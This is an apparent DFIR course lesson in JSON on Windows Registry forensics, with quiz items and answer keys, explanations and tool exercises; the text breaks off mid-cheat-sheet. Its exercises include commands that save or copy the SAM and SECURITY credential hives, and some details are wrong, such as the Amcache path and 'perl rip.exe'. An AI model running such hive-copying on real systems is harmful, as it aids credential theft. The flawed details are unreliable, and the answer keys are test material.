{
  "lesson_id": "93389b7b-e0c3-4d6b-9243-8ae49b8c509f",
  "domain": "dfir",
  "title": "The Windows Registry Fundamentals",
  "difficulty": 2,
  "order_index": 11,
  "prerequisites": [
    "eb47f98c-2144-4c23-83d8-5990fe4ac1c2"
  ],
  "concepts": [
    "Registry hive structure and architecture",
    "Root keys (HKLM, HKCU, HKU, HKCR, HKCC)",
    "Registry data types (REG_SZ, REG_DWORD, REG_BINARY)",
    "Registry forensic artifacts",
    "Transaction logs and dirty hives",
    "Registry analysis tools (RegRipper, Registry Explorer, RECmd)"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Windows Registry hierarchical database architecture",
    "Identify and analyze the five root registry keys and their purposes",
    "Recognize common registry data types and their forensic significance",
    "Navigate registry hives using forensic tools (Registry Explorer, RECmd)",
    "Locate critical forensic artifacts in registry keys",
    "Understand transaction logs and their role in registry recovery"
  ],
  "post_assessment": [
    {
      "question_id": "reg-fund-001",
      "question": "Which registry root key contains system-wide configuration settings and hardware information?",
      "options": [
        "HKEY_CURRENT_USER",
        "HKEY_LOCAL_MACHINE",
        "HKEY_USERS",
        "HKEY_CLASSES_ROOT"
      ],
      "correct_answer": 1,
      "explanation": "HKEY_LOCAL_MACHINE (HKLM) contains system-wide configuration settings, hardware information, and software installations that apply to all users. It's stored in multiple hive files including SYSTEM, SOFTWARE, SAM, and SECURITY.",
      "type": "multiple_choice",
      "difficulty": 1
    },
    {
      "question_id": "reg-fund-002",
      "question": "What is the file location of the NTUSER.DAT hive?",
      "options": [
        "C:\\Windows\\System32\\config\\",
        "C:\\Users\\<username>\\",
        "C:\\Windows\\ServiceProfiles\\",
        "C:\\ProgramData\\Microsoft\\"
      ],
      "correct_answer": 1,
      "explanation": "NTUSER.DAT is located in each user's profile directory at C:\\Users\\<username>\\NTUSER.DAT. It contains user-specific settings and preferences for that particular user account.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "reg-fund-003",
      "question": "Which registry data type is used to store a list of null-terminated strings?",
      "options": [
        "REG_SZ",
        "REG_MULTI_SZ",
        "REG_EXPAND_SZ",
        "REG_BINARY"
      ],
      "correct_answer": 1,
      "explanation": "REG_MULTI_SZ is used to store multiple null-terminated strings in a single value, often used for lists like device IDs or service dependencies. Each string is separated by a null character, with a double null terminating the entire list.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "reg-fund-004",
      "question": "What is the purpose of registry transaction logs (.LOG1, .LOG2)?",
      "options": [
        "To backup the entire registry automatically",
        "To record changes before committing them to the main hive for crash recovery",
        "To track user access to registry keys",
        "To encrypt sensitive registry data"
      ],
      "correct_answer": 1,
      "explanation": "Transaction logs (.LOG1 and .LOG2) use a write-ahead logging mechanism to record registry changes before they're committed to the main hive file. This ensures registry consistency if a system crashes during a write operation. Forensically, these logs can reveal recent registry modifications.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "reg-fund-005",
      "question": "Which tool provides a GUI for forensic analysis of offline registry hives with bookmarks and favorites?",
      "options": [
        "Regedit.exe",
        "RegRipper",
        "Registry Explorer",
        "RECmd"
      ],
      "correct_answer": 2,
      "explanation": "Registry Explorer (by Eric Zimmerman) provides a powerful GUI for analyzing offline registry hives with features like bookmarks, favorites, dirty indicators, deleted key recovery, and integrated searching. RegRipper is plugin-based CLI, and RECmd is command-line only.",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "active_learning",
    "meta_learning",
    "minimum_effective_dose",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Welcome to the Heart of Windows: The Registry\n\nYou're about to explore one of the most powerful forensic data sources in Windows - the Registry. Think of it as Windows' DNA database - every configuration, every user action, every installed program leaves traces here.\n\nWhy is this exciting? Because while attackers focus on hiding files and processes, they often forget that the Registry records everything. That AutoRun key that launches malware at startup? Recorded. That USB device plugged in at 2:47 AM? Recorded. That program executed last Tuesday? Recorded.\n\nBy the end of this lesson, you'll be able to navigate the Registry like a detective at a crime scene, knowing exactly where to look for evidence. This isn't just theory - you're learning the same techniques used to investigate major breaches at Fortune 500 companies.\n\nLet's unlock Windows' memory vault together!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Windows Registry Architecture: The Ultimate Configuration Database\n\n## What is the Windows Registry?\n\nThe Windows Registry is a **hierarchical database** that stores configuration settings, user preferences, hardware information, and system state for the Windows operating system and installed applications. Introduced in Windows 3.1 (1992) and fully implemented in Windows NT, it replaced the scattered .INI files of earlier Windows versions.\n\n### Why the Registry Matters for DFIR\n\nFrom a forensic perspective, the Registry is **pure gold** because it contains:\n\n1. **User Activity Artifacts**: Recently accessed files, typed URLs, search terms\n2. **System Configuration**: Network settings, services, drivers, security policies\n3. **Program Execution Evidence**: MRU lists, UserAssist, last run times\n4. **Persistence Mechanisms**: AutoRun keys where malware hides\n5. **Connected Devices**: USB devices, network shares, printers\n6. **Temporal Data**: Last write timestamps for every key\n\n**Real-World Impact**: In the 2017 NotPetya ransomware attack, forensic investigators used registry artifacts to:\n- Identify patient zero through USB device connection history\n- Reconstruct attack timeline using AutoRun persistence keys\n- Determine lateral movement paths via RDP connection history\n\n---\n\n## Registry Architecture: The Five Root Keys\n\nThe Registry appears as a unified tree structure with **five root keys** (also called \"hives\"), but behind the scenes, it's stored in multiple files on disk.\n\n### The Five Root Keys\n\n```\nREGISTRY ROOT\n‚îú‚îÄ‚îÄ HKEY_LOCAL_MACHINE (HKLM)    [System-wide settings]\n‚îú‚îÄ‚îÄ HKEY_CURRENT_USER (HKCU)      [Current user settings]\n‚îú‚îÄ‚îÄ HKEY_USERS (HKU)              [All user profiles]\n‚îú‚îÄ‚îÄ HKEY_CLASSES_ROOT (HKCR)     [File associations]\n‚îî‚îÄ‚îÄ HKEY_CURRENT_CONFIG (HKCC)   [Current hardware profile]\n```\n\n### 1. HKEY_LOCAL_MACHINE (HKLM)\n\n**Scope**: System-wide settings for all users  \n**Forensic Importance**: ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Critical)\n\n**Contains**:\n- `HKLM\\SYSTEM` ‚Üí System configuration, services, drivers\n- `HKLM\\SOFTWARE` ‚Üí Installed applications (system-wide)\n- `HKLM\\SAM` ‚Üí Security Account Manager (user accounts)\n- `HKLM\\SECURITY` ‚Üí Security policies and permissions\n- `HKLM\\HARDWARE` ‚Üí Hardware information (volatile, not saved to disk)\n\n**File Locations**:\n```\nC:\\Windows\\System32\\config\\SYSTEM\nC:\\Windows\\System32\\config\\SOFTWARE\nC:\\Windows\\System32\\config\\SAM\nC:\\Windows\\System32\\config\\SECURITY\n```\n\n**Key Forensic Artifacts**:\n- **Services**: `HKLM\\SYSTEM\\CurrentControlSet\\Services` (malware persistence)\n- **AutoRun**: `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`\n- **USB History**: `HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`\n- **Network Configuration**: `HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters`\n\n---\n\n### 2. HKEY_CURRENT_USER (HKCU)\n\n**Scope**: Settings for the currently logged-in user  \n**Forensic Importance**: ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Critical)\n\n**Reality**: HKCU is actually a **symbolic link** (alias) pointing to the current user's hive in `HKEY_USERS\\<SID>`.\n\n**File Location**:\n```\nC:\\Users\\<username>\\NTUSER.DAT\n```\n\n**Key Forensic Artifacts**:\n- **Run/RunOnce Keys**: `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- **RecentDocs**: Recently opened files per extension\n- **TypedPaths**: Manually typed paths in Explorer address bar\n- **UserAssist**: GUI program execution with run count and timestamps\n- **MRU Lists**: Most Recently Used files/searches\n\n---\n\n### 3. HKEY_USERS (HKU)\n\n**Scope**: All loaded user profiles  \n**Forensic Importance**: ‚≠ê‚≠ê‚≠ê‚≠ê (High)\n\n**Contains**: Subkeys for each user's Security Identifier (SID)\n\n```\nHKEY_USERS\n‚îú‚îÄ‚îÄ S-1-5-18          [Local System account]\n‚îú‚îÄ‚îÄ S-1-5-19          [Local Service account]\n‚îú‚îÄ‚îÄ S-1-5-20          [Network Service account]\n‚îú‚îÄ‚îÄ S-1-5-21-xxx-500  [Administrator]\n‚îî‚îÄ‚îÄ S-1-5-21-xxx-1001 [Regular user - John]\n```\n\n**Forensic Use**: Access settings for users not currently logged in by analyzing their SID subkey.\n\n---\n\n### 4. HKEY_CLASSES_ROOT (HKCR)\n\n**Scope**: File associations and COM object registration  \n**Forensic Importance**: ‚≠ê‚≠ê‚≠ê (Medium)\n\n**Reality**: HKCR is a **merged view** of:\n- `HKLM\\SOFTWARE\\Classes` (system-wide)\n- `HKCU\\SOFTWARE\\Classes` (user-specific overrides)\n\n**Forensic Artifacts**:\n- **File Extension Handlers**: `.pdf ‚Üí AcroRd32.exe`\n- **Malicious File Associations**: Attackers may hijack `.txt` to execute malware\n- **COM Objects**: DLL-based persistence via COM hijacking\n\n---\n\n### 5. HKEY_CURRENT_CONFIG (HKCC)\n\n**Scope**: Current hardware profile  \n**Forensic Importance**: ‚≠ê (Low)\n\n**Reality**: Alias pointing to `HKLM\\SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current`\n\n**Limited Forensic Value**: Mostly used for hardware configuration, rarely contains user activity artifacts.\n\n---\n\n## Registry Data Types: Understanding Value Storage\n\nRegistry keys contain **values** (like variables) with specific data types:\n\n| Data Type | Description | Example Use |\n|-----------|-------------|-------------|\n| **REG_SZ** | String (null-terminated) | Program paths, names |\n| **REG_EXPAND_SZ** | Expandable string with environment variables | `%SystemRoot%\\System32\\cmd.exe` |\n| **REG_MULTI_SZ** | Multiple strings (double null-terminated) | Device lists, service dependencies |\n| **REG_DWORD** | 32-bit number | Flags, counts, boolean values (0/1) |\n| **REG_QWORD** | 64-bit number | Large numbers, timestamps |\n| **REG_BINARY** | Raw binary data | Arbitrary bytes, encrypted data |\n\n### Forensic Data Type Examples\n\n**REG_SZ Example**: Program name\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nMalware: \"C:\\Users\\Alice\\AppData\\update.exe\"\n```\n\n**REG_DWORD Example**: UserAssist execution count\n```\nValue: 0x00000014  (Decimal: 20 executions)\n```\n\n**REG_BINARY Example**: UserAssist ROT13-encoded program name\n```\nHex: 50 72 6F 67 72 61 6D 00\nDecoded: \"Program\"\n```\n\n---\n\n## Registry Hive Files: Physical Storage\n\nWhile the Registry appears as a unified tree in Regedit, it's actually stored in multiple **hive files** on disk.\n\n### System Hives (HKLM)\n\n| Hive File | Location | Registry Key |\n|-----------|----------|-------------|\n| SYSTEM | `C:\\Windows\\System32\\config\\SYSTEM` | `HKLM\\SYSTEM` |\n| SOFTWARE | `C:\\Windows\\System32\\config\\SOFTWARE` | `HKLM\\SOFTWARE` |\n| SAM | `C:\\Windows\\System32\\config\\SAM` | `HKLM\\SAM` |\n| SECURITY | `C:\\Windows\\System32\\config\\SECURITY` | `HKLM\\SECURITY` |\n| DEFAULT | `C:\\Windows\\System32\\config\\DEFAULT` | `HKU\\.DEFAULT` |\n\n### User Hives (HKCU/HKU)\n\n| Hive File | Location | Registry Key |\n|-----------|----------|-------------|\n| NTUSER.DAT | `C:\\Users\\<username>\\NTUSER.DAT` | `HKCU` (when logged in) |\n| UsrClass.dat | `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat` | `HKCU\\Software\\Classes` |\n\n### Special Hive: AmCache.hve\n\n```\nC:\\Windows\\AppData\\Programs\\Amcache.hve\n```\n\n**Purpose**: Application execution history (program inventory)  \n**Key**: `ROOT\\File` (contains SHA-1 hashes, execution paths, timestamps)\n\n---\n\n## Transaction Logs: The Forensic Safety Net\n\nEvery registry hive has associated **transaction logs** that ensure data consistency:\n\n```\nC:\\Windows\\System32\\config\\\n‚îú‚îÄ‚îÄ SYSTEM\n‚îú‚îÄ‚îÄ SYSTEM.LOG1         [Primary transaction log]\n‚îú‚îÄ‚îÄ SYSTEM.LOG2         [Secondary transaction log]\n‚îú‚îÄ‚îÄ SOFTWARE\n‚îú‚îÄ‚îÄ SOFTWARE.LOG1\n‚îî‚îÄ‚îÄ SOFTWARE.LOG2\n```\n\n### How Transaction Logs Work (Write-Ahead Logging)\n\n1. **Before** writing to the main hive, Windows writes changes to `.LOG1`\n2. If the system crashes mid-write, Windows uses the log to **replay** or **rollback** the transaction\n3. `.LOG2` serves as a backup if `.LOG1` is corrupted\n\n### Forensic Significance\n\n**Dirty Hives**: A hive with uncommitted changes in transaction logs (system crashed before changes were written).\n\n**Tools like Registry Explorer** show a **\"dirty\" indicator** and can parse transaction logs to reveal:\n- Registry modifications that occurred seconds before a crash\n- Recently added AutoRun keys (malware persistence)\n- Keys deleted by anti-forensic tools (recovery possible from logs)\n\n**Example**: In a 2019 ransomware case, investigators recovered the malware's persistence key from transaction logs even though the attacker had deleted it from the main hive.\n\n---\n\n## Last Write Timestamps: The Registry Timeline\n\nEvery registry **key** (not value) has a **Last Write Timestamp** that records when the key was last modified.\n\n### What Triggers a Last Write Update?\n\n- Creating a new subkey\n- Deleting a subkey\n- Adding/modifying/deleting a value within the key\n\n### Forensic Use Cases\n\n**Timeline Reconstruction**: Correlate registry timestamps with file system events\n\n```\n2024-11-01 14:23:45 - USB device connected (USBSTOR key written)\n2024-11-01 14:24:12 - Malware copied to USB (file MACB timestamp)\n2024-11-01 14:24:58 - Malware AutoRun key created (Run key last write)\n```\n\n**Temporal Artifacts Example**:\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.pdf\nLast Write: 2024-11-01 09:15:32 UTC\nInterpretation: User opened a PDF file at this time\n```\n\n---\n\n## Registry Analysis Tools: The Forensic Toolkit\n\n### 1. Registry Explorer (Eric Zimmerman)\n\n**Type**: GUI  \n**Best For**: Interactive analysis, exploring unknown hives\n\n**Key Features**:\n- ‚úÖ Open offline hives (no need to mount)\n- ‚úÖ Bookmarks for important forensic keys\n- ‚úÖ \"Dirty\" indicator for uncommitted changes\n- ‚úÖ Transaction log parsing\n- ‚úÖ Deleted key recovery\n- ‚úÖ Hex view for binary data\n\n**Download**: https://ericzimmerman.github.io/\n\n### 2. RECmd (Eric Zimmerman)\n\n**Type**: Command-line  \n**Best For**: Batch processing, scripting, automation\n\n**Example Command**:\n```powershell\nRECmd.exe -f \"C:\\Users\\Alice\\NTUSER.DAT\" --bn BatchFiles\\UserActivity.reb\n```\n\n**Output**: CSV files with parsed artifacts (Run keys, RecentDocs, TypedPaths, etc.)\n\n### 3. RegRipper\n\n**Type**: Plugin-based CLI  \n**Best For**: Automated artifact extraction with pre-built parsers\n\n**Example**:\n```bash\nrip.exe -r NTUSER.DAT -f ntuser\n```\n\n**Output**: Text report with all known NTUSER.DAT artifacts\n\n**Limitation**: Requires Perl, plugins need updates for new Windows versions\n\n---\n\n## Registry Hive Backup and Recovery\n\nWindows automatically backs up registry hives:\n\n### RegBack Folder (Legacy)\n\n```\nC:\\Windows\\System32\\config\\RegBack\\\n```\n\n**Note**: Starting Windows 10 1803, this folder is **empty by default** (disabled for performance). Must be manually enabled.\n\n### Volume Shadow Copies (VSS)\n\nWindows creates VSS snapshots that include registry hives:\n\n```bash\nvssadmin list shadows\n```\n\n**Forensic Use**: Access historical registry states from VSS snapshots to see what keys existed days/weeks ago.\n\n**Example**:\n```\nCurrent: No AutoRun key for malware (attacker deleted it)\nVSS from 5 days ago: AutoRun key present ‚Üí Proves malware was installed\n```\n\n---\n\n## Common Forensic Registry Locations (Cheat Sheet)\n\n### User Activity\n\n| Artifact | Registry Path |\n|----------|---------------|\n| Recently opened files | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs` |\n| Typed Explorer paths | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths` |\n| Run/search history | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU` |\n| UserAssist (GUI programs) | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist` |\n\n### Persistence Mechanisms\n\n| Type | Registry Path |\n|------|---------------|\n| User-level AutoRun | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` |\n| System-level AutoRun | `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` |\n| Services | `HKLM\\SYSTEM\\CurrentControlSet\\Services` |\n| Scheduled Tasks | `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache` |\n\n### Network and Devices\n\n| Artifact | Registry Path |\n|----------|---------------|\n| USB devices | `HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR` |\n| Network shares | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2` |\n| WiFi networks | `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles` |\n\n### Program Execution\n\n| Artifact | Registry Path |\n|----------|---------------|\n| Shimcache | `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache` |\n| AmCache | `ROOT\\File` in `C:\\Windows\\AppData\\Programs\\Amcache.hve` |\n| MUICache | `HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache` |\n\n---\n\n## Registry Forensics Workflow\n\nHere's the professional approach to registry analysis:\n\n### Step 1: Acquisition\n```\n1. Copy hive files (SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT, UsrClass.dat)\n2. Copy transaction logs (.LOG1, .LOG2)\n3. Calculate hash values (SHA-256) for integrity verification\n4. Document acquisition date/time and custodian\n```\n\n### Step 2: Initial Triage\n```\n1. Check for \"dirty\" hives (uncommitted transactions)\n2. Parse transaction logs for recent changes\n3. Verify hive structure (not corrupted)\n4. Identify Windows version from SOFTWARE hive\n```\n\n### Step 3: Artifact Extraction\n```\n1. Run automated tools (RegRipper, RECmd batch files)\n2. Extract known artifacts (Run keys, RecentDocs, UserAssist)\n3. Parse execution artifacts (Shimcache, AmCache, MUICache)\n4. Document USB device history\n```\n\n### Step 4: Manual Investigation\n```\n1. Open hives in Registry Explorer\n2. Use bookmarks to navigate to suspicious keys\n3. Examine last write timestamps\n4. Look for anomalies (unusual persistence keys, encoded data)\n```\n\n### Step 5: Timeline Integration\n```\n1. Export registry timestamps\n2. Correlate with filesystem timeline (MFT, $LogFile)\n3. Build comprehensive attack timeline\n4. Document findings in forensic report\n```\n\n---\n\n## Key Takeaways\n\n1. **Five Root Keys**: HKLM (system), HKCU (user), HKU (all users), HKCR (file associations), HKCC (hardware)\n2. **Physical Storage**: Registry stored in hive files (SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT)\n3. **Transaction Logs**: .LOG1 and .LOG2 files can recover recent changes (write-ahead logging)\n4. **Last Write Timestamps**: Every key has a timestamp showing when it was last modified\n5. **Data Types**: REG_SZ (string), REG_DWORD (number), REG_BINARY (bytes), etc.\n6. **Forensic Tools**: Registry Explorer (GUI), RECmd (CLI batch), RegRipper (plugin-based)\n7. **Critical Artifacts**: Run keys (persistence), RecentDocs (file access), USBSTOR (device history)\n\nThe Registry is not just a configuration database - it's a **comprehensive audit log** of system and user activity. Master registry forensics, and you'll uncover evidence that attackers never knew they left behind."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Registry Analysis Exercises\n\n## Exercise 1: Navigate Registry with PowerShell\n\nWindows PowerShell treats the Registry like a filesystem using **PSDrive** providers.\n\n### List Root Keys\n```powershell\n# View all registry PSDrives\nGet-PSDrive -PSProvider Registry\n\n# Output:\nName           Used (GB)     Free (GB) Provider      Root\n----           ---------     --------- --------      ----\nHKCR                                   Registry      HKEY_CLASSES_ROOT\nHKCU                                   Registry      HKEY_CURRENT_USER\nHKLM                                   Registry      HKEY_LOCAL_MACHINE\nHKU                                    Registry      HKEY_USERS\n```\n\n### Navigate to Run Key\n```powershell\n# Change directory to AutoRun key\ncd HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# List all entries\nGet-ItemProperty .\n\n# Output shows programs that auto-start for current user\n```\n\n### Query Specific Value\n```powershell\n# Get UserAssist key (ROT13 encoded program names)\n$path = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\"\nGet-ItemProperty $path\n```\n\n---\n\n## Exercise 2: Export Registry Hives for Offline Analysis\n\n### Using Built-in reg.exe\n```cmd\n:: Export SYSTEM hive\nreg save HKLM\\SYSTEM C:\\Forensics\\SYSTEM.hiv\n\n:: Export SOFTWARE hive\nreg save HKLM\\SOFTWARE C:\\Forensics\\SOFTWARE.hiv\n\n:: Export user hive (requires admin and user not logged in)\nreg save HKU\\S-1-5-21-xxx-1001 C:\\Forensics\\NTUSER_John.hiv\n```\n\n**Note**: Requires **Administrator privileges** and hives must not be locked (user not logged in).\n\n### Copy Hive Files Directly (Forensic Acquisition)\n\nOn a live system, registry hives are **locked**. Use forensic tools or offline acquisition:\n\n```powershell\n# On offline disk or forensic image\n$source = \"E:\\Windows\\System32\\config\"\n$dest = \"C:\\Forensics\\Registry\"\n\nCopy-Item \"$source\\SYSTEM*\" -Destination $dest\nCopy-Item \"$source\\SOFTWARE*\" -Destination $dest\nCopy-Item \"$source\\SAM*\" -Destination $dest\nCopy-Item \"$source\\SECURITY*\" -Destination $dest\n\n# Copy user hives\nCopy-Item \"E:\\Users\\*\\NTUSER.DAT*\" -Destination $dest\nCopy-Item \"E:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat*\" -Destination $dest\n```\n\n**Critical**: Always copy **transaction logs** (*.LOG1, *.LOG2) alongside hive files!\n\n---\n\n## Exercise 3: Analyze Hive with Registry Explorer\n\n### Step 1: Open Offline Hive\n```\n1. Launch Registry Explorer (RegistryExplorer.exe)\n2. File ‚Üí Load Hive\n3. Select NTUSER.DAT from C:\\Forensics\\Registry\n4. Note: No need to \"mount\" - opens read-only\n```\n\n### Step 2: Use Bookmarks for Key Artifacts\n```\n1. View ‚Üí Bookmarks\n2. Select \"Recently Opened Documents\"\n3. Observe list of files with MRU order and timestamps\n4. Right-click key ‚Üí \"Copy Key Path\"\n```\n\n### Step 3: Check for Dirty Hive\n```\n1. Look at status bar (bottom of window)\n2. If shows \"Hive is dirty\", click \"Parse transaction logs\"\n3. Registry Explorer applies LOG1/LOG2 changes\n4. Compare before/after to see uncommitted changes\n```\n\n### Step 4: Export to CSV\n```\n1. Navigate to: Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\n2. Right-click key ‚Üí \"Export to CSV\"\n3. Save as RecentDocs.csv\n4. Open in Excel or Timeline Explorer for analysis\n```\n\n---\n\n## Exercise 4: Batch Parsing with RECmd\n\n### Download RECmd\n```powershell\n# From https://ericzimmerman.github.io/\nwget https://f001.backblazeb2.com/file/EricZimmermanTools/RECmd.zip\nExpand-Archive RECmd.zip -DestinationPath C:\\Tools\\RECmd\n```\n\n### Run Batch File for User Activity\n```cmd\ncd C:\\Tools\\RECmd\n\n:: Parse NTUSER.DAT with user activity batch file\nRECmd.exe -f \"C:\\Forensics\\Registry\\NTUSER.DAT\" --bn \"BatchFiles\\Kroll_Batch.reb\" --csv \"C:\\Output\" --csvf NTUSER_artifacts.csv\n```\n\n**Output**: CSV file with:\n- Run keys\n- RecentDocs (all extensions)\n- TypedPaths\n- UserAssist (decoded)\n- MRU lists\n\n### Parse SYSTEM Hive for USB Devices\n```cmd\nRECmd.exe -f \"C:\\Forensics\\Registry\\SYSTEM\" --bn \"BatchFiles\\SYSTEM_USB.reb\" --csv \"C:\\Output\" --csvf USB_devices.csv\n```\n\n**Output**: All connected USB storage devices with:\n- Vendor ID\n- Product ID\n- Serial number\n- Device name\n- First connection timestamp\n- Last connection timestamp\n\n---\n\n## Exercise 5: RegRipper Plugin-Based Analysis\n\n### Install RegRipper (Windows)\n```powershell\n# Download from https://github.com/keydet89/RegRipper3.0\ngit clone https://github.com/keydet89/RegRipper3.0.git C:\\Tools\\RegRipper\n\n# Install Strawberry Perl (required)\n# Download from https://strawberryperl.com/\n```\n\n### Run RegRipper Against NTUSER.DAT\n```cmd\ncd C:\\Tools\\RegRipper\n\n:: Analyze NTUSER.DAT with all ntuser plugins\nperl rip.exe -r \"C:\\Forensics\\Registry\\NTUSER.DAT\" -f ntuser > ntuser_report.txt\n```\n\n### Extract Specific Artifact (RecentDocs)\n```cmd\n:: Run only recentdocs plugin\nperl rip.exe -r \"C:\\Forensics\\Registry\\NTUSER.DAT\" -p recentdocs > recentdocs.txt\n```\n\n### List Available Plugins\n```cmd\n:: See all plugins and descriptions\nperl rip.exe -l -f ntuser\n\nOutput:\nPlugin Name            Description\n-----------            -----------\nrecentdocs             Parse RecentDocs key for file access\nuserassist             Decode UserAssist GUIDs (ROT13)\ntypedpaths             Show manually typed Explorer paths\nrun                    AutoRun keys (persistence)\n...\n```\n\n---\n\n## Exercise 6: Decode UserAssist (ROT13)\n\nUserAssist values are **ROT13 encoded** to obfuscate program names.\n\n### Manual Decoding\n```python\nimport codecs\n\n# Encoded name from registry\nencoded = \"Pvephf.rkr\"\n\n# Decode ROT13\ndecoded = codecs.decode(encoded, 'rot_13')\nprint(f\"Decoded: {decoded}\")\n\n# Output: Decoded: Circus.exe\n```\n\n### Parse UserAssist Binary Data\n\nUserAssist values contain binary data with:\n- Execution count (4 bytes at offset 4)\n- Last execution timestamp (8 bytes at offset 60)\n\n```python\nimport struct\nfrom datetime import datetime, timedelta\n\n# Example binary data (first 72 bytes of UserAssist value)\nbinary_data = bytes.fromhex(\"00000000 14000000 00000000 00000000 ...\")\n\n# Extract execution count (DWORD at offset 4)\nexec_count = struct.unpack('<I', binary_data[4:8])[0]\nprint(f\"Execution Count: {exec_count}\")\n\n# Extract last execution timestamp (FILETIME at offset 60)\nfiletime = struct.unpack('<Q', binary_data[60:68])[0]\n\n# Convert Windows FILETIME to UTC datetime\nif filetime > 0:\n    epoch = datetime(1601, 1, 1)\n    last_exec = epoch + timedelta(microseconds=filetime/10)\n    print(f\"Last Executed: {last_exec} UTC\")\n```\n\n**Output**:\n```\nExecution Count: 20\nLast Executed: 2024-11-01 14:32:18 UTC\n```\n\n---\n\n## Exercise 7: Timeline Integration\n\n### Export Registry Timestamps\n```cmd\n:: RECmd with timeline output\nRECmd.exe -f \"C:\\Forensics\\Registry\\NTUSER.DAT\" --bn \"BatchFiles\\Timeline.reb\" --csv \"C:\\Output\" --csvf timeline.csv\n```\n\n### Import into Timeline Explorer\n```\n1. Open TimelineExplorer.exe (by Eric Zimmerman)\n2. File ‚Üí Open ‚Üí Select timeline.csv\n3. View all registry artifacts in chronological order\n4. Filter by timestamp range (e.g., date of incident)\n5. Sort by \"Source\" column to group artifact types\n```\n\n### Correlate with Filesystem Timeline\n```powershell\n# Generate MFT timeline with MFTECmd\nMFTECmd.exe -f \"C:\\Forensics\\MFT\\$MFT\" --csv \"C:\\Output\" --csvf mft_timeline.csv\n\n# Merge timelines\ncd C:\\Output\nGet-Content registry_timeline.csv, mft_timeline.csv | Set-Content merged_timeline.csv\n\n# Open merged_timeline.csv in Timeline Explorer\n```\n\n**Forensic Win**: Correlate registry AutoRun key creation (malware persistence) with file creation on disk (malware dropped) to reconstruct attack sequence.\n\n---\n\n## Exercise 8: Identify Malware Persistence\n\n### Check Common AutoRun Locations\n```powershell\n# User-level Run key\nGet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# System-level Run key\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Look for suspicious entries:\n# - Random names (e.g., \"svchost32\", \"windowsupdate\")\n# - Paths in user AppData folders\n# - Base64 encoded commands\n# - PowerShell scripts\n```\n\n### Investigate Suspicious Entry\n```powershell\n# Example: Malicious entry found\nGet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" | Select-Object Updater\n\n# Output:\nUpdater: C:\\Users\\Alice\\AppData\\Roaming\\Microsoft\\update.exe\n\n# Check file hash\nGet-FileHash \"C:\\Users\\Alice\\AppData\\Roaming\\Microsoft\\update.exe\" -Algorithm SHA256\n\n# Search hash on VirusTotal\n```\n\n---\n\n## Challenge Exercise: Reconstruct User Activity\n\nUsing the registry hives from a suspect workstation:\n\n1. **Identify all programs executed** (UserAssist, MUICache, AmCache)\n2. **List recently accessed documents** (RecentDocs by extension)\n3. **Find USB devices connected** (USBSTOR enumeration)\n4. **Determine network shares accessed** (MountPoints2)\n5. **Detect persistence mechanisms** (Run keys, Services)\n6. **Build a timeline** (correlate all artifacts by timestamp)\n\n**Tools**: Registry Explorer, RECmd, Timeline Explorer\n\n**Goal**: Create a comprehensive user activity report answering:\n- What programs did the user run?\n- What files did they access?\n- What external devices did they connect?\n- Did they access network shares?\n- Is there evidence of malware persistence?\n\n---\n\n## Key Commands Cheat Sheet\n\n```powershell\n# PowerShell Registry Navigation\nGet-PSDrive -PSProvider Registry\ncd HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ItemProperty .\n\n# Export Hive (cmd.exe as Administrator)\nreg save HKLM\\SYSTEM C:\\Forensics\\SYSTEM.hiv\n\n# RECmd Batch Processing\nRECmd.exe 